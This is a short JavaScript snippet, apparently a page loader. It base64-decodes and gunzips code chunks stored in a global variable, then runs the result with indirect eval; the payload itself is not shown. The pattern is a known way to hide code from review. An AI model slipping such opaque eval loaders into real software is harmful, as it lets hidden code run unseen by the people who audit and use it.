(async function(){
  const b64 = (window.__APP_CHUNKS||[]).join('');
  const bin = atob(b64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  const ds = new DecompressionStream('gzip');
  const stream = new Response(bytes).body.pipeThrough(ds);
  const code = await new Response(stream).text();
  (0, eval)(code);
})();
